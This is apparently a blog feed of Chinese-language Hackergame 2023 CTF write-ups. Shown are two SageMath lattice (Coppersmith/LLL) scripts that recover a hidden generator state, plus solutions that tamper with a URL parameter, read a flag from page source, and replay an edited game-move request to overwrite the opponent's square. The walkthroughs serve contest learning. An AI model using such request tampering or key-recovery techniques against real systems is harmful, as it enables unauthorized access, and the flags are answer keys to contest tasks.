class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> sage.rings.polynomial.multi_polynomial_sequence <span class="keyword">import</span> PolynomialSequence</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = PolynomialSequence([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">        power = N ^ (m-i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = power</span><br><span class="line">            <span class="keyword">for</span> variable, shift <span class="keyword">in</span> <span class="built_in">zip</span>(f.variables(), shifts):</span><br><span class="line">                g *= variable ^ shift</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line">    B = B.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> B*monomials:</span><br><span class="line">        <span class="keyword">if</span> h.is_zero():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        H.append(h.change_ring(QQ))</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            V = I.variety(ring=ZZ)</span><br><span class="line">            <span class="keyword">if</span> V:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> V:</span><br><span class="line">                    root = <span class="built_in">map</span>(R, <span class="built_in">map</span>(root.__getitem__, f.variables()))</span><br><span class="line">                    roots.append(<span class="built_in">tuple</span>(root))</span><br><span class="line">                <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">p = <span class="number">8130783200765099079371905805653275305530953408368486972439144538377172762778724178293921761601331901642956558545531112904308756365058449689105893951902947</span></span><br><span class="line">q = <span class="number">11454088000212950190744304417071055599116596384509623856814663255888235693331192150623151438185124694138841377055326544017433007065922209282946188611202987</span></span><br><span class="line">lfp = <span class="number">556695256623252691766599489994025390137</span></span><br><span class="line">lfq = <span class="number">625845849695411279745162870674729131439</span></span><br><span class="line">N = p*q</span><br><span class="line">e = -<span class="number">3</span></span><br><span class="line"></span><br><span class="line">mbar = <span class="number">573046980537607907730089729000433259422879383552606763033164754066292843681918904561070723206971334204344866440480927073770327173961454188585854505141069244788355571694396962542754658258199054695288751216512033298300658634987185377441765796869134184212323944158160885988500722088</span></span><br><span class="line">cbar = <span class="number">654623699439508739504705671022791775232662503157271314760513975989848071893308099460646567253762397788835192372411637701492138597346833898525007897948224992066710053594670104732362677192600705075779551377483754803864141595089548025417326462516667075558417906351163970399836100141</span></span><br><span class="line"></span><br><span class="line">kbits = <span class="number">96</span></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">nbits = N.nbits()</span><br><span class="line"></span><br><span class="line">F.&lt;x,y&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = ((mbar + x*<span class="number">2</span>^(nbits-<span class="number">96</span>))^(e*-<span class="number">1</span>))*(cbar+y*<span class="number">2</span>^(nbits-<span class="number">96</span>))-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">roots = small_roots(f,(<span class="number">2</span>^<span class="number">96</span>, <span class="number">2</span> ^<span class="number">96</span>),m=<span class="number">1</span>,d=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">    x0 = roots[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    m = mbar + x0*(Integer(<span class="number">2</span>)**(nbits-Integer(<span class="number">96</span>)))</span><br><span class="line">    state = <span class="built_in">pow</span>(m,e,N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;state: &quot;</span>,state)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No roots found.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>首先与终端交互得到最后两个随机数</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231101093700569.png" alt="image-20231101093700569"></p><p>使用sage跑出state</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231101093602518.png" alt="image-20231101093602518"></p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231101093542372.png" alt="image-20231101093542372"></p><h4 id="一発勝負"><a href="#一発勝負" class="headerlink" title="一発勝負"></a>一発勝負</h4><p>第二问和第一问基本一致</p><p>只不过前一个state为96位</p><p>将sage脚本修改如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> sage.rings.polynomial.multi_polynomial_sequence <span class="keyword">import</span> PolynomialSequence</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">small_roots</span>(<span class="params">f, bounds, m=<span class="number">1</span>, d=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> d:</span><br><span class="line">        d = f.degree()</span><br><span class="line"></span><br><span class="line">    R = f.base_ring()</span><br><span class="line">    N = R.cardinality()</span><br><span class="line"></span><br><span class="line">    f /= f.coefficients().pop(<span class="number">0</span>)</span><br><span class="line">    f = f.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    G = PolynomialSequence([], f.parent())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m+<span class="number">1</span>):</span><br><span class="line">        power = N ^ (m-i) * f ^ i</span><br><span class="line">        <span class="keyword">for</span> shifts <span class="keyword">in</span> itertools.product(<span class="built_in">range</span>(d), repeat=f.nvariables()):</span><br><span class="line">            g = power</span><br><span class="line">            <span class="keyword">for</span> variable, shift <span class="keyword">in</span> <span class="built_in">zip</span>(f.variables(), shifts):</span><br><span class="line">                g *= variable ^ shift</span><br><span class="line">            G.append(g)</span><br><span class="line"></span><br><span class="line">    B, monomials = G.coefficient_matrix()</span><br><span class="line">    monomials = vector(monomials)</span><br><span class="line"></span><br><span class="line">    factors = [monomial(*bounds) <span class="keyword">for</span> monomial <span class="keyword">in</span> monomials]</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, factor)</span><br><span class="line"></span><br><span class="line">    B = B.dense_matrix().LLL()</span><br><span class="line"></span><br><span class="line">    B = B.change_ring(QQ)</span><br><span class="line">    <span class="keyword">for</span> i, factor <span class="keyword">in</span> <span class="built_in">enumerate</span>(factors):</span><br><span class="line">        B.rescale_col(i, <span class="number">1</span>/factor)</span><br><span class="line">    B = B.change_ring(ZZ)</span><br><span class="line"></span><br><span class="line">    H = <span class="type">Sequence</span>([], f.parent().change_ring(QQ))</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> B*monomials:</span><br><span class="line">        <span class="keyword">if</span> h.is_zero():</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        H.append(h.change_ring(QQ))</span><br><span class="line">        I = H.ideal()</span><br><span class="line">        <span class="keyword">if</span> I.dimension() == -<span class="number">1</span>:</span><br><span class="line">            H.pop()</span><br><span class="line">        <span class="keyword">elif</span> I.dimension() == <span class="number">0</span>:</span><br><span class="line">            V = I.variety(ring=ZZ)</span><br><span class="line">            <span class="keyword">if</span> V:</span><br><span class="line">                roots = []</span><br><span class="line">                <span class="keyword">for</span> root <span class="keyword">in</span> V:</span><br><span class="line">                    root = <span class="built_in">map</span>(R, <span class="built_in">map</span>(root.__getitem__, f.variables()))</span><br><span class="line">                    roots.append(<span class="built_in">tuple</span>(root))</span><br><span class="line">                <span class="keyword">return</span> roots</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> []</span><br><span class="line">p = <span class="number">8130783200765099079371905805653275305530953408368486972439144538377172762778724178293921761601331901642956558545531112904308756365058449689105893951902947</span></span><br><span class="line">q = <span class="number">11454088000212950190744304417071055599116596384509623856814663255888235693331192150623151438185124694138841377055326544017433007065922209282946188611202987</span></span><br><span class="line">lfp = <span class="number">556695256623252691766599489994025390137</span></span><br><span class="line">lfq = <span class="number">625845849695411279745162870674729131439</span></span><br><span class="line">N = p*q</span><br><span class="line">e = -<span class="number">3</span></span><br><span class="line"></span><br><span class="line">cbar = <span class="number">819212024021465240183460848146393861498847152851752305375003064596154363694419328851582400347264127493568263786494744431611241418449168299316709232129735483745080438685137492117863951945931260321536681990451901618835408354392089274304831850047887110473255104650685834245709041136</span></span><br><span class="line"></span><br><span class="line">kbits = <span class="number">96</span></span><br><span class="line">beta = <span class="number">1</span></span><br><span class="line">nbits = N.nbits()</span><br><span class="line"></span><br><span class="line">F.&lt;x,y&gt; = PolynomialRing(Zmod(N))</span><br><span class="line">f = x^(e*-<span class="number">1</span>)*(cbar+y*<span class="number">2</span>^(nbits-<span class="number">96</span>))-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">roots = small_roots(f,(<span class="number">2</span>^<span class="number">96</span>, <span class="number">2</span> ^<span class="number">96</span>),m=<span class="number">1</span>,d=<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> roots:</span><br><span class="line">    x0 = roots[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    m = x0</span><br><span class="line">    state = <span class="built_in">pow</span>(m,e,N)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;state: &quot;</span>,state)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No roots found.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231101100611084.png" alt="image-20231101100611084"></p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231101123604005-16990734425451.png" alt="image-20231101123604005"></p>]]></content>
      
      
      <categories>
          
          <category> Hackergame </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WriteUp </tag>
            
            <tag> Hackergame </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame 2023 Summary(part1)</title>
      <link href="/posts/308d7c720973/"/>
      <url>/posts/308d7c720973/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>成功挤进校内前5，总榜前70</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231104123531580.png" alt="image-20231104123531580"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231104123607446.png" alt="image-20231104123607446"></p><p>欣慰地看到这一年来的努力没有白费，自己的技术力有见长</p><p>也欣慰地看到今年的排行榜分数比去年更卷了，这是好事，说明网安圈高技术力的师傅们越来越多了，以后也能看到更多大佬们的技术分享文章</p><h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><h3 id="Hackergame-启动"><a href="#Hackergame-启动" class="headerlink" title="Hackergame 启动"></a>Hackergame 启动</h3><p>和去年的签到题一样，考点是GET请求传参</p><p>由于准确率是前端判断后通过GET传给similarity，所以直接手动修改url即可</p><p><code>https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity=100</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028123120216.png" alt="image-20231028123120216"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028123142362.png" alt="image-20231028123142362"></p><h3 id="猫咪小测"><a href="#猫咪小测" class="headerlink" title="猫咪小测"></a>猫咪小测</h3><ol><li><p>想要借阅世界图书出版公司出版的《A Classical Introduction To Modern Number Theory 2nd ed.》，应当前往中国科学技术大学西区图书馆的哪一层？<strong>（30 分）</strong><br>提示：是一个非负整数。</p><p>来到中科大图书馆官方网站</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028123545301.png" alt="image-20231028123545301"></p><p>检索关键词，找到图书</p><p>发现在<strong>西区外文书库</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028124425696.png" alt="image-20231028124425696"></p><p>搜索发现西区外文书库在12楼</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028125929373.png" alt="image-20231028125929373"></p></li><li><p>今年 arXiv 网站的天体物理版块上有人发表了一篇关于「可观测宇宙中的鸡的密度上限」的论文，请问论文中作者计算出的鸡密度函数的上限为 10 的多少次方每立方秒差距？<strong>（30 分）</strong><br>提示：是一个非负整数。</p><p>在arXiv网站中检索</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028130936924.png" alt="image-20231028130936924"></p><p>读论文这种事情就交给GPT了</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028131406013.png" alt="image-20231028131406013"></p></li><li><p>为了支持 TCP BBR 拥塞控制算法，在<strong>编译</strong> Linux 内核时应该配置好哪一条内核选项？<strong>（20 分）</strong><br>提示：输入格式为 CONFIG_XXXXX，如 CONFIG_SCHED_SMT。</p><p>同样交给GPT</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028131600758.png" alt="image-20231028131600758"></p><ol><li><p>🥒🥒🥒：「我……从没觉得写类型标注有意思过」。在一篇论文中，作者给出了能够让 Python 的类型检查器 <del>MyPY</del> mypy 陷入死循环的代码，并证明 Python 的类型检查和停机问题一样困难。请问这篇论文发表在今年的哪个学术会议上？<strong>（20 分）</strong></p><p>提示：会议的大写英文简称，比如 ISCA、CCS、ICML。</p><p>谷歌学术搜索关键词 mypy endless loop</p><p>找到一篇2022年发布预印本的论文Python Type Hints Are Turing Complete</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028143124933.png" alt="image-20231028143124933"></p><p>搜索后找到会议名</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028143211765.png" alt="image-20231028143211765"></p><p><code>ECOOP</code></p></li></ol></li></ol><h3 id="更深更暗"><a href="#更深更暗" class="headerlink" title="更深更暗"></a>更深更暗</h3><p>题目页面的文字提示flag在最深处</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028143603368.png" alt="image-20231028143603368"></p><p>用不着手动翻，直接查看源代码即可</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028143844003.png" alt="image-20231028143844003"></p><p><code>flag&#123;T1t@n_f36a6c9528684bf2df12270a14d36927&#125;</code></p><h3 id="旅行照片-3-0"><a href="#旅行照片-3-0" class="headerlink" title="旅行照片 3.0"></a>旅行照片 3.0</h3><p>题目简介如下</p><blockquote><p>你的学长去留学了，这一走短时间内怕是回不来了。于是，你在今年暑假来了一场计划已久的旅行，并顺路探望了这位久别的学长。翻阅当天拍下的照片， 种种回忆和感慨油然而生。</p><p>请观察照片并结合所有文字内容，正确回答题目以获取 flag。</p></blockquote><p>首先要确定学校的位置，从之后的描述中，我们能确认他们在日本范围活动</p><p>信息量更大的是中午和下午的描述：</p><blockquote><p>🌻 中午</p><p>离开校园后，你和学长走到了附近的一家<strong>拉面馆</strong>用餐。那家店里的拉面香气扑鼻，店内的装饰和氛围也充满了日式的风格。 学长（下图左一）与你分享了不少学校的趣事。饭后，你们决定在附近散步，享受这难得的闲暇时光。当你们走到一座博物馆前时， 马路对面的喷泉和它周围的景色引起了你的注意。下午，白色的帐篷里<strong>即将</strong>举办一场<strong>大型活动</strong>，人们忙碌的身影穿梭其中，充满了期待与热情。</p><p>🌻 下午和夜晚</p><p>在参观完<strong>博物馆</strong>后，学长陪你走到了<strong>上野站</strong>。你们都感到有些不舍，但知道每次的分别也是为了下次更好的相聚。 学长那天晚上将继续他的学术之旅，打算乘船欣赏东京的迷人夜景和闪耀的彩虹大桥（Rainbow Bridge）。 而你则搭乘了开往马里奥世界的电车，在那里度过了一段欢乐的时光。</p></blockquote><p>我将其中的关键词都高亮了出来，我们现在知道该学校在上野站附近，同时周围有拉面店和博物馆</p><p>博物馆附近在举行大型活动，而且举办地有喷泉</p><p>那么出现了一个定位点，我们就需要搜寻它们的具体信息，进而推理出学校是哪一所</p><p>庆幸的是第二张图能很好的为已有信息给出补充</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028213043320.png" alt="image-20231028213043320">很显然，学长参加了<strong>statphys28</strong>，而他们吃饭的地方叫<strong>一信</strong>拉面馆</p><div class="note info flat"><p><strong>Statphys</strong>是国际统计物理大会的简称，是一个由国际统计物理学会（IUPAP）主办的会议。这个会议旨在为统计物理、计算机科学、数学等学科之间的交叉研究提供一个平台，让学者和学生们可以交流最新的研究成果和挑战性的重要问题。Statphys会议每两年举办一次，是统计物理领域最重要的国际会议之一。</p></div><p>那么这一届的会议举办地在日本东京</p><p>去官网查询一下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028213610257.png" alt="image-20231028213610257"></p><p>时间是2023年8月7-11号，地点在东京大学本乡校区</p><p>我们在google map上找一下附近的拉面馆和博物馆</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028214417989.png" alt="image-20231028214417989"></p><p>东大附近有一个东京都美术馆和东京国立博物馆，既然题目里说的是博物馆，那么就暂且锁定为<strong>东京国立博物馆</strong></p><p>搜索一信拉面，确实就在附近，我们的想法也得到验证</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028215020743.png" alt="image-20231028215020743"></p><p>寻找第3张图的位置</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/03.jpg" alt="03"></p><p>我们需要在地图上找到大片空地，然后在街景中验证</p><p>锁定<strong>上野公园大喷水</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028223359990.png" alt="image-20231028223359990"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028223257481.png" alt="image-20231028223257481"></p><p>我们需要知道在这里举办的是什么活动，这样我们就能确定时间</p><p>用日语搜索上野公园大喷水活动</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028224900804.png" alt="image-20231028224900804"></p><p>其中<strong>梅酒祭</strong>和<strong>statphys28</strong>的时间相对比较重合</p><p>我们先来做前面两题</p><p><strong>1、你还记得与学长见面这天是哪一天吗？（格式：yyyy-mm-dd）</strong></p><p>梅酒祭在2023年8月10日开始举办，所以答案为2023-08-10</p><p><strong>2、在学校该展厅展示的所有同种金色奖牌的得主中，出生最晚者获奖时所在的研究所缩写是什么？</strong></p><p>这里涉及到第一张图</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/01.jpg" alt="01"></p><p>图中为诺贝尔奖物理和化学奖牌，该奖牌得主为<strong>小柴昌俊</strong></p><p>我们搜索一下东大诺贝尔奖展览<code>Tokyo University Nobel Exhibits</code>，发现校内的科学画廊确实有诺贝尔奖展览</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028221318349.png" alt="image-20231028221318349"></p><p>比对一下，其中出生最晚的是<strong>Takaaki Kajita教授</strong>，他所在研究所为<strong>东京大学宇宙辐射研究所(ICRR)</strong></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028221547761.png" alt="image-20231028221547761"></p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028224646710.png" alt="image-20231028224646710"></p><p>来看3-4题</p><p><strong>3、帐篷中活动招募志愿者时用于收集报名信息的在线问卷的编号（以字母 S 开头后接数字）是多少？</strong></p><p>帐篷中活动即梅酒祭</p><p>在刚刚那个旅游资讯网站中我们发现了梅酒祭的官方网站</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028225350937.png" alt="image-20231028225350937"></p><p>进入活动官网</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028225554832.png" alt="image-20231028225554832"></p><p>找到志愿者招募网址</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028225646224.png" alt="image-20231028225646224"></p><p>得到申请表编号<code>S495584522</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028225736394.png" alt="image-20231028225736394"></p><p><strong>4、学长购买自己的博物馆门票时，花费了多少日元？</strong></p><p>因为前面我们以经确认了博物馆为<strong>东京国立博物馆</strong>，我们去官网查找购票信息</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028230305754.png" alt="image-20231028230305754"></p><p>大学生门票500日元</p><p>但是这题没有这么简单，深入搜索后，我发现东大也在校园会员行列中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028231155123.png" alt="image-20231028231155123"></p><p>所以学长应该可以免费观展</p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028230457153.png" alt="image-20231028230457153"></p><p><strong>5、学长当天晚上需要在哪栋标志性建筑物的附近集合呢？（请用简体中文回答，四个汉字）</strong></p><p>题目的描述说学长<strong>要继续学术之旅</strong>，而<strong>集合</strong>这种带有命令性质的词，说明学长晚上参加的是<strong>statphys28</strong>的活动</p><p>翻看官网的日程表</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030012130605.png" alt="image-20231030012130605"></p><p>那个时间段是<strong>宴会（Banquet）</strong>环节，说明我们的猜测正确</p><p>官网正好有发活动照片，我们浏览一下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030012313931.png" alt="image-20231030012313931"></p><p>是在一条船上，也就是东京著名的<strong>水上巴士</strong>线路，之前有所耳闻，不过需要验证一下是否经过彩虹大桥，百度一下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028232104606.png" alt="image-20231028232104606"></p><p>搜索该宴会的信息，依然是在官网</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030012833776.png" alt="image-20231030012833776"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030013248221.png" alt="image-20231030013248221"></p><p>给出了集合地点：<strong>东京大学本乡校区 安田礼堂南侧</strong></p><p>东大附近的标志性建筑就是<strong>东京巨蛋</strong>了，或者是<strong>安田讲堂</strong>本身</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030013132061.png" alt="image-20231030013132061"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030013955799.png" alt="image-20231030013955799"></p><p><strong>6、进站时，你在 JR 上野站中央检票口外看到「ボタン＆カフリンクス」活动正在销售动物周边商品，该活动张贴的粉色背景海报上是什么动物（记作 A，两个汉字）？ 在出站处附近建筑的屋顶广告牌上，每小时都会顽皮出现的那只 3D 动物是什么品种？（记作 B，三个汉字）？（格式：A-B）</strong></p><p>这种活动的图片直接谷歌很难搜到</p><p>尝试在推特上搜索</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028234605602.png" alt="image-20231028234605602"></p><p>该动物为<strong>熊猫</strong></p><p>任天堂主题乐园位于日本大阪环球影城，所以终点站为<strong>JR大阪环球影城站</strong>或<strong>JR大阪站</strong></p><p>附近的广告牌上可能有<strong>秋田犬</strong>、<strong>金钱豹</strong></p><p>排列组合一下</p><p>得到flag</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030084151332.png" alt="image-20231030084151332"></p><h3 id="赛博井字棋"><a href="#赛博井字棋" class="headerlink" title="赛博井字棋"></a>赛博井字棋</h3><p>观察题目的站点</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231028144301564.png" alt="image-20231028144301564"></p><p>小游戏的页面，一般需要通过修改前端JS中的规则</p><p>观察源码，发现判断胜负是在后端进行，通过前端将每一步下的位置传给后端</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030085414755.png" alt="image-20231030085414755"></p><p>一般来说井字棋永远不可能下赢AI，我们只能突破规则的限制</p><p>由于棋盘的OX是由数字存储，我们可以<strong>覆盖AI下过的地方</strong></p><p>而前端对下同一个地方进行了过滤，那我们可以<strong>拦截请求并修改</strong></p><p>由于该网站没有证书，bp抓不了，选择使用edge自带的网络功能</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030093018402.png" alt="image-20231030093018402"></p><p>我们可以看到下棋的位置为<strong>json格式</strong></p><p>右键编辑并重新发送</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20231030093102554.png" alt="image-20231030093102554"></p><p>在<strong>网络控制台</strong>将下棋位置改为AI下的地方(1,1)</p><p><img 